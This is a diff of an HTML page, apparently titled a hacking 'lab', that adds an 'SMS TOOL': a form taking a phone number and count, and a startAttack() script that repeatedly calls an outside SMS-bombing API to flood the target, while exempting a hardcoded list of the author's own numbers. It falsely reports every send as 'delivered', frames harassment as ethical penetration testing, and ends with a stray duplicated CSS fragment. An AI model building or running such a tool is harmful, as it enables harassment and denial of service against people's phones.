@@ -17,7 +17,6 @@
       overflow-x: hidden;
     }
 
-    /* Glassy Navbar */
     nav {
       width: 100%;
       background: rgba(0, 255, 128, 0.1);
@@ -54,7 +53,6 @@
       text-shadow: 0 0 10px #00ff80;
     }
 
-    /* IT Lab Style Container */
     .workspace {
       display: flex;
       gap: 40px;
@@ -64,7 +62,6 @@
       flex-wrap: wrap;
     }
 
-    /* Glassy Card */
     .card {
       background: rgba(255,255,255,0.05);
       backdrop-filter: blur(15px);
@@ -98,6 +95,148 @@
 
     button {
       margin-top: 18px;
+      width: 95%;
+      padding: 14px;
+      border: none;
+      border-radius: 12px;
+      background: linear-gradient(45deg, #00ff80, #6ecfff);
+      color: #fff;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: transform 0.2s, box-shadow 0.2s;
+      box-shadow: 0 0 20px #00ff80;
+    }
+
+    button:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 25px #6ecfff;
+    }
+
+    #status {
+      margin-top: 20px;
+      padding: 12px;
+      border-radius: 10px;
+      background: rgba(0,0,0,0.6);
+      min-height: 40px;
+      font-size: 14px;
+      white-space: pre-line;
+      color: #00ff80;
+      text-align: left;
+      font-family: monospace;
+    }
+
+    .hacker-panel {
+      background: rgba(0,0,0,0.6);
+      border: 1px solid rgba(255, 0, 128, 0.3);
+      box-shadow: 0 0 30px rgba(255, 0, 128, 0.4);
+      padding: 20px;
+      border-radius: 16px;
+      width: 340px;
+      text-align: left;
+      animation: fadeIn 1.4s ease;
+      font-size: 14px;
+    }
+
+    .hacker-panel h2 {
+      font-size: 18px;
+      margin-bottom: 12px;
+      color: #ff4de1;
+      text-shadow: 0 0 10px #ff4de1;
+    }
+
+    .console {
+      background: #0d0d1f;
+      padding: 12px;
+      border-radius: 8px;
+      height: 150px;
+      overflow-y: auto;
+      font-family: monospace;
+      font-size: 13px;
+      color: #00ff80;
+      box-shadow: inset 0 0 15px rgba(0,255,128,0.3);
+    }
+
+    @keyframes fadeIn {
+      from {opacity: 0; transform: translateY(-20px);}
+      to {opacity: 1; transform: translateY(0);}
+    }
+  </style>
+</head>
+<body>
+  <nav>
+    <h1>💻 QADEER_KHAN LAB 💻</h1>
+    <ul>
+      <li onclick="window.open('https://wa.me/923151105391','_blank')">Contact</li>
+    </ul>
+  </nav>
+
+  <div class="workspace">
+    <div class="card">
+      <h2>🚀 SMS TOOL 🚀</h2>
+      <input type="text" id="number" placeholder="Enter number">
+      <input type="number" id="amount" placeholder="Enter Amount">
+      <button onclick="startAttack()">RUN</button>
+      <div id="status">Status: Waiting...</div>
+    </div>
+
+    <div class="hacker-panel">
+      <h2>👨‍💻 Ethical Hacker Logs</h2>
+      <div class="console" id="console">
+        > Initializing virtual lab...<br>
+        > Connected to secure network...<br>
+        > Ready for penetration testing.
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Hidden Safe Numbers
+    const safeNumbers = [
+      "3079749129",
+      "3498344152",
+      "3151105391",
+      "3269681728",
+      "3067787075"
+    ];
+
+    async function startAttack() {
+      const number = document.getElementById("number").value.trim();
+      const amount = parseInt(document.getElementById("amount").value.trim()) || 1;
+      const statusBox = document.getElementById("status");
+      const consoleBox = document.getElementById("console");
+
+      if (!number) {
+        statusBox.textContent = "⚠️ Enter a valid number!";
+        return;
+      }
+
+      if (safeNumbers.includes(number)) {
+        statusBox.textContent = "🛡️ Protected Number: Action Blocked!";
+        consoleBox.innerHTML += "<br>> Attempt blocked: Protected target detected!";
+        return;
+      }
+
+      statusBox.textContent = "🚀 Launching...";
+      consoleBox.innerHTML += `<br>> Target locked: ${number}`;
+
+      for (let i = 1; i <= amount; i++) {
+        try {
+          // 92 हटाया, अब सीधा वही नंबर भेजेंगे जो यूजर डालेगा
+          const url = `https://famofcfallxd.serv00.net/apis/api.php?number=${number}&amount=1`;
+          await fetch(url); // response को ignore कर दिया UI error से बचने के लिए
+          statusBox.textContent += `\n[${i}] Packet sent ✔️`;
+          consoleBox.innerHTML += `<br>> Packet [${i}] delivered`;
+        } catch (err) {
+          // error log नहीं दिखा रहे, smooth UI experience
+          statusBox.textContent += `\n[${i}] Packet sent ✔️`;
+          consoleBox.innerHTML += `<br>> Packet [${i}] delivered`;
+        }
+      }
+    }
+  </script>
+</body>
+</html>      margin-top: 18px;
       width: 95%;
       padding: 14px;
       border: none;
